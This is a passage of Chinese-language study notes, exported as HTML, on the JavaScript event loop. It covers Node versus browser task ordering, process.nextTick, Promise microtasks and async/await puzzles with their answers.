12pt;"><br/></span></div><div><span style="font-size: 12pt;">思考：我们现在已经知道，<span style="font-size: 12pt; font-weight: bold;">不管你整什么微任务过来，只要它不是 process.nextTick 派发的，全部都要排队在 process.nextTick 后面执行。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">因此输出顺序是：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">nextTick1</span></div><div><span style="font-size: 12pt;">nextTick2</span></div><div><span style="font-size: 12pt;">nextTick3</span></div><div><span style="font-size: 12pt;">nextTick4</span></div><div><span style="font-size: 12pt;">promise1</span></div><div><span style="font-size: 12pt;">promise2</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log('timeout1');</font></div><div><font style="font-size: 12pt;">}, 0);   </font></div><div><br/></div><div><font style="font-size: 12pt;">setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log('timeout2');</font></div><div><font style="font-size: 12pt;">  Promise.resolve().then(function() {</font></div><div><font style="font-size: 12pt;">    console.log('promise1');</font></div><div><font style="font-size: 12pt;">  });</font></div><div><font style="font-size: 12pt;">}, 0);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log('timeout3')</font></div><div><font style="font-size: 12pt;">}, 0)</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">问：上述代码在浏览器、Node 中的执行结果各是什么？</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">这题很险，但各位只要记住一句话：Node11 开始，Node 的事件循环已经和浏览器趋同。注意是“趋同”而不是一毛一样。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">其中最明显的改变是：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">Node11 开始，timers 阶段的 setTimeout、setInterval 等函数派发的任务、包括 setImmediate 派发的任务，</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">都被修改为：一旦执行完当前阶段的一个任务，就立刻执行微任务队列。</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">以下是 v9.3.0 版本下的执行结果：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/5ec65125000138c712600314.jpg" type="image/jpeg" data-filename="5ec65125000138c712600314.jpg" width="1260"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">我们看到在 timers 阶段，依次执行了所有的 setTimeout 回调、清空了队列——这符合我们前面对 Node 事件循环机制的描述。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">以下是 v12.4.1 版本下的执行结果：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/5ec6512c0001979e11040310.jpg" type="image/jpeg" data-filename="5ec6512c0001979e11040310.jpg" width="1104"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">同时我们再看一下浏览器跑上面代码的结果：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/5ec651320001232a10020220.jpg" type="image/jpeg" data-filename="5ec651320001232a10020220.jpg" width="1002"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">很明显，Node11及以上的版本，对这段代码的执行结果和浏览器一毛一样。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">总结</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">同步任务及每个阶段之后都会清空 microtask 队列</span></div><div><br/></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 优先清空 next tick queue，即通过 process.nextTick 注册的函数</span></div><div><br/></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 再清空 other queue，常见的如 Promise</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">Node 的 Event Loop 分阶段（宏任务的阶段），阶段有先后，依次是</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">    ● expired timers and intervals，即到期的 setTimeout/setInterval</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> I/O events，包含文件，网络等等</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> immediates，通过 setImmediate 注册的函数</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">    </span><span style="font-size: 12pt;">●</span> <span style="font-size: 12pt;">close handlers，close 事件的回调，比如 TCP 连接断开</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">和规范的区别，在于 node 会清空当前所处阶段的队列，即执行当前阶段的所有 task （宏任务）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">EventLoop 的一些题</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><a href="https://juejin.cn/post/6844903987183894535" style="font-size: 12pt;">https://juejin.cn/post/6844903987183894535</a></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [41].jpg" type="image/jpeg" data-filename="3.jpg" width="433"/></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">console.log(1)</span></div><div><br/></div><div><span style="font-size: 12pt;">setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">    console.log(2)</span></div><div><span style="font-size: 12pt;">    new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt;">        console.log(4)</span></div><div><span style="font-size: 12pt;">        resolve()</span></div><div><span style="font-size: 12pt;">    }).then(() =&gt; {</span></div><div><span style="font-size: 12pt;">        console.log(5)</span></div><div><span style="font-size: 12pt;">    })</span></div><div><span style="font-size: 12pt;">})</span></div><div><br/></div><div><span style="font-size: 12pt;">new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt;">    console.log(7)</span></div><div><span style="font-size: 12pt;">    resolve()</span></div><div><span style="font-size: 12pt;">}).then(() =&gt; {</span></div><div><span style="font-size: 12pt;">    console.log(8)</span></div><div><span style="font-size: 12pt;">})</span></div><div><br/></div><div><span style="font-size: 12pt;">setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">    console.log(9)</span></div><div><span style="font-size: 12pt;">    new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt;">        console.log(11)</span></div><div><span style="font-size: 12pt;">        resolve()</span></div><div><span style="font-size: 12pt;">    }).then(() =&gt; {</span></div><div><span style="font-size: 12pt;">        console.log(12)</span></div><div><span style="font-size: 12pt;">    })</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><span style="font-size: 12pt;">分析如下：</span></div><div><br/></div><div><span style="font-size: 12pt;">1. 同步运行的代码首先输出：1、7</span></div><div><br/></div><div><span style="font-size: 12pt;">2. 接着，清空 microtask 队列：8</span></div><div><br/></div><div><span style="font-size: 12pt;">3. 第一个 task 执行：2、4</span></div><div><br/></div><div><span style="font-size: 12pt;">4. 接着，清空 microtask 队列：5</span></div><div><br/></div><div><span style="font-size: 12pt;">5. 第二个 task 执行：9、11</span></div><div><br/></div><div><span style="font-size: 12pt;">6. 接着，清空 microtask 队列：12</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">第一道题</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt;">    resolve(1);</span></div><div><br/></div><div><span style="font-size: 12pt;">    Promise.resolve().then(() =&gt; {</span></div><div><span style="font-size: 12pt;">        // t2</span></div><div><span style="font-size: 12pt;">        console.log(2)</span></div><div><span style="font-size: 12pt;">    });</span></div><div><span style="font-size: 12pt;">    console.log(4)</span></div><div><span style="font-size: 12pt;">}).then(t =&gt; {</span></div><div><span style="font-size: 12pt;">        // t1</span></div><div><span style="font-size: 12pt;">        console.log(t)</span></div><div><span style="font-size: 12pt;">});</span></div><div><span style="font-size: 12pt;">console.log(3);</span></div></div><div><br/></div><div><span style="font-size: 12pt;">这段代码的流程大致如下：</span></div><div><br/></div><div><span style="font-size: 12pt;">1. script 任务先运行。首先遇到 Promise 实例，构造函数首先执行，所以首先输出了 4。此时 microtask 的任务有 t2 和 t1</span></div><div><br/></div><div><span style="font-size: 12pt;">2. script 任务继续运行，输出 3。至此，第一个宏任务执行完成。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">3. 执行所有的微任务，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">t2 比 t1 会先进入 microtask 的 Promise 队列，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">先后取出 t2 和 t1，分别输出 2 和 1</span></div><div><br/></div><div><span style="font-size: 12pt;">4. 代码执行完毕</span></div><div><br/></div><div><span style="font-size: 12pt;">综上，上述代码的输出是：4321</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">第二道题</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">async function async1(){</span></div><div><span style="font-size: 12pt;">    console.log('async1 start')</span></div><div><span style="font-size: 12pt;">    await async2()</span></div><div><span style="font-size: 12pt;">    console.log('async1 end')</span></div><div><span style="font-size: 12pt;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">async function async2(){</span></div><div><span style="font-size: 12pt;">    console.log('async2')</span></div><div><span style="font-size: 12pt;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">console.log('script start')</span></div><div><br/></div><div><span style="font-size: 12pt;">setTimeout(function(){</span></div><div><span style="font-size: 12pt;">    console.log('setTimeout')</span></div><div><span style="font-size: 12pt;">},0)  </span></div><div><br/></div><div><span style="font-size: 12pt;">async1();</span></div><div><br/></div><div><span style="font-size: 12pt;">new Promise(function(resolve){</span></div><div><span style="font-size: 12pt;">    console.log('promise1')</span></div><div><span style="font-size: 12pt;">    resolve();</span></div><div><span style="font-size: 12pt;">}).then(function(){</span></div><div><span style="font-size: 12pt;">    console.log('promise2')</span></div><div><span style="font-size: 12pt;">})</span></div><div><br/></div><div><span style="font-size: 12pt;">console.log('script end')</span></div></div><div><br/></div><div><span style="font-size: 12pt;">答案</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">script start</span></div><div><span style="font-size: 12pt;">async1 start</span></div><div><span style="font-size: 12pt;">async2</span></div><div><span style="font-size: 12pt;">promise1</span></div><div><span style="font-size: 12pt;">script end</span></div><div><span style="font-size: 12pt;">async1 end</span></div><div><span style="font-size: 12pt;">promise2</span></div><div><span style="font-size: 12pt;">setTimeout</span></div></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">从另一道题分析：</span> <a href="https://segmentfault.com/q/1010000016147496" style="font-size: 12pt; font-weight: bold;">https://segmentfault.com/q/1010000016147496</a></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">async function async1(){</span></div><div><span style="font-size: 12pt;">  await async2();</span></div><div><span style="font-size: 12pt;">  console.log('async1 end');</span></div><div><span style="font-size: 12pt;">}</span></div><div><span style="font-size: 12pt;">async function async2(){}</span></div><div><br/></div><div><span style="font-size: 12pt;">async1();</span></div><div><br/></div><div><span style="font-size: 12pt;">new Promise(function (resolve) {</span></div><div><span style="font-size: 12pt;">  resolve();</span></div><div><span style="font-size: 12pt;">}).then(function () {</span></div><div><span style="font-size: 12pt;">  console.log('promise2');</span></div><div><span style="font-size: 12pt;">}).then(function () {</span></div><div><span style="font-size: 12pt;">  console.log('promise3');</span></div><div><span style="font-size: 12pt;">}).then(function () {</span></div><div><span style="font-size: 12pt;">  console.log('promise4');</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><span style="font-size: 12pt;">thenable 对象指的是具有 then 方法的对象，比如下面这个对象。</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">let thenable = {</span></div><div><span style="font-size: 12pt;">  then: function (resolve, reject) {</span></div><div><span style="font-size: 12pt;">    resolve(42);</span></div><div><span style="font-size: 12pt;">  }</span></div><div><span style="font-size: 12pt;">};</span></div></div><div><br/></div><div><span style="font-size: 12pt;">Promise.resolve 方法会将这个对象转为 Promise 对象，然后就立即执行 thenable 对象的 then 方法。</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">let thenable = {</span></div><div><span style="font-size: 12pt;">  then: function (resolve, reject) {</span></div><div><span style="font-size: 12pt;">    resolve(42);</span></div><div><span style="font-size: 12pt;">  }</span></div><div><span style="font-size: 12pt;">};</span></div><div><br/></div><div><span style="font-size: 12pt;">let p1 = Promise.resolve(thenable);</span></div><div><span style="font-size: 12pt;">p1.then(function(value) {</span></div><div><span style="font-size: 12pt;">  console.log(value);  // 42</span></div><div><span style="font-size: 12pt;">});</span></div></div><div><br/></div><div><span style="font-size: 12pt;">上面代码中，thenable 对象的 then 方法执行后，对象 p1 的状态就变为 resolved，从而立即执行最后那个 then 方法指定的回调函数，输出 42。</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">我们用 RESOLVE 来表示下面 Promise 构造函数里的 resolve：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt;">  resolve(non-thenable)</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">可以转换成</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">Promise.resolve(non-thenable)</span></div></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">RESOLVE(non-thenable) 等于 Promise.resolve(non-thenable)</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">而 </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">RESOLVE(thenable) 并不等于 Promise.resolve(thenable) ， </span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">根据规范，RESOLVE(thenable) 和 Promise.resolve(thenable) 会这样转换：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt;">  resolve(thenable)</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">会被转换成</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt;">  Promise.resolve().then(() =&gt; {</span></div><div><span style="font-size: 12pt;">    thenable.then(resolve)</span></div><div><span style="font-size: 12pt;">  })</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt;">因为</span><span style="font-size: 12pt;"> async2() 返回一个 promise，是一个 thenable 对象，也就是这样：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt;">  resolve(thenable)</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><span style="font-size: 12pt;">因此上面代码会被转换成：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt;">  Promise.resolve().then(() =&gt; {</span></div><div><span style="font-size: 12pt;">    thenable.then(resolve)</span></div><div><span style="font-size: 12pt;">  })</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">所以</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">async function async1(){</span></div><div><span style="font-size: 12pt;">  await async2()</span></div><div><span style="font-size: 12pt;">  console.log('async1 end')</span></div><div><span style="font-size: 12pt;">}</span></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">因为</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt;">  Promise.resolve().then(() =&gt; {</span></div><div><span style="font-size: 12pt;">    thenable.then(resolve)</span></div><div><span style="font-size: 12pt;">  })</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">又因为</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">Promise.resolve()</span></div></div><div><br/></div><div><span style="font-size: 12pt;">等价于</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise(function (resolve) {</span></div><div><span style="font-size: 12pt;">  resolve();</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">最后相当于</span><span style="font-size: 12pt;">（</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">这里有三个 .then，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">注：这是 chrome 73版本之前的转换方法</span><span style="font-size: 12pt;">）</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">async function async1() {</span></div><div><span style="font-size: 12pt;">  return new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt;">    Promise.resolve().then(() =&gt; {</span></div><div><span style="font-size: 12pt;">      async2().then(resolve)</span></div><div><span style="font-size: 12pt;">    })</span></div><div><span style="font-size: 12pt;">  }).then(() =&gt; {</span></div><div><span style="font-size: 12pt;">    console.log('async1 end')</span></div><div><span style="font-size: 12pt;">  })</span></div><div><span style="font-size: 12pt;">}</span></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">结果为</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">promise2</span></div><div><span style="font-size: 12pt;">promise3</span></div><div><span style="font-size: 12pt;">async1 end</span></div><div><span style="font-size: 12pt;">promise4</span></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">Await 规范的更新</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">async function async1(){</span></div><div><span style="font-size: 12pt;">  await async2()</span></div><div><span style="font-size: 12pt;">  console.log('async1 end')</span></div><div><span style="font-size: 12pt;">}</span></div></div><div><br/></div><div><span style="font-size: 12pt;">也就是 </span><span style="font-size: 12pt;">async1 不再采用 new Promise 来包装里面的东西，</span><span style="font-size: 12pt;">而是直接采用一个 Promise.resolve() 来包装</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">async function async1() {</span></div><div><span style="font-size: 12pt;">  Promise.resolve(async2()).then(() =&gt; {</span></div><div><span style="font-size: 12pt;">    console.log('async1 end')</span></div><div><span style="font-size: 12pt;">  })</span></div><div><span style="font-size: 12pt; color: rgb(0, 0, 0);">}</span></div></div><div><br/></div><div><span style="font-size: 12pt;">Promise.resolve(promise) 返回 promise, 即 Promise.resolve(async2()) 等价于 async2() ，所以</span></div><div><br/></div><div><span style="font-size: 12pt;">现在（chrome 73之后）相当于（</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">只有一个 .then，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">更容易理解，且提高性能</span><span style="font-size: 12pt;">）</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">async function async1 () {</span></div><div><span style="font-size: 12pt;">  async2().then(() =&gt; {</span></div><div><span style="font-size: 12pt;">    console.log('async1 end')</span></div><div><span style="font-size: 12pt;">  })</span></div><div><span style="font-size: 12pt;">}</span></div></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">async 现在相当于 Promise.resolve() ，在其它场景可以表示 Promise.reject()</span></div><div><br/></div><div><span style="font-size: 12pt;">结果为</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">async1 end</span></div><div><span style="font-size: 12pt;">promise2</span></div><div><span style="font-size: 12pt;">promise3</span></div><div><span style="font-size: 12pt;">promise4</span></div></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">再加以修改</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">async function async1() {</span></div><div><span style="font-size: 12pt;">  console.log('async1 start')</span></div><div><span style="font-size: 12pt;">  await async2()</span></div><div><span style="font-size: 12pt;">  console.log('async1 end')</span></div><div><span style="font-size: 12pt;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">async function async2() {</span></div><div><span style="font-size: 12pt;">  return Promise.resolve('async2').then(console.log)</span></div><div><span style="font-size: 12pt;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">console.log('script start')</span></div><div><br/></div><div><span style="font-size: 12pt;">setTimeout(function () {</span></div><div><span style="font-size: 12pt;">  console.log('setTimeout')</span></div><div><span style="font-size: 12pt;">}, 0)</span></div><div><br/></div><div><span style="font-size: 12pt;">async1();</span></div><div><br/></div><div><span style="font-size: 12pt;">new Promise(function (resolve) {</span></div><div><span style="font-size: 12pt;">  console.log('promise1')</span></div><div><span style="font-size: 12pt;">  resolve();</span></div><div><span style="font-size: 12pt;">}).then(function () {</span></div><div><span style="font-size: 12pt;">  console.log('promise2')</span></div><div><span style="font-size: 12pt;">})</span></div><div><br/></div><div><span style="font-size: 12pt;">console.log('script end')</span></div></div><div><br/></div><div><span style="font-size: 12pt;">答案</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">script start</span></div><div><span style="font-size: 12pt;">async1 start</span></div><div><span style="font-size: 12pt;">promise1</span></div><div><span style="font-size: 12pt;">script end</span></div><div><span style="font-size: 12pt;">async2</span></div><div><span style="font-size: 12pt;">promise2</span></div><div><span style="font-size: 12pt;">async1 end</span></div><div><span style="font-size: 12pt;">setTimeout</span></div></div><div><br/></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">setTimeout(()=&gt;{</span></div><div><span 